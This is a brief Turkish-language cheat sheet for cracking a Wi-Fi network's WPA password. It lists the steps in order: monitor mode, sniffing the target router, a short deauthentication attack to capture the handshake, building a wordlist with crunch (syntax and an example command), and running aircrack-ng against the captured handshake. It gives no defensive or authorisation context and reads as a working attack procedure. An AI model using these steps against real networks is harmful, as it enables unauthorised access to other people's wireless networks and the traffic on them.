1) Monitör Mod - Modem Dinle - Hedef Modemi Dinle ve Write Et
2) Modemi dinlemeye devam ederken kısa bir deauth yap ve handshake yakala
3) Wordlist oluştur veya hazır wordlist bul.
	- crunch \<min karakter\> \<max karakter\> \<içerebileceği karakterler\> -o wordlist
	- crunch 8 10 abcdx12345 -o worldist
4) aircrack-ng \<handshake cap\> -w wordlist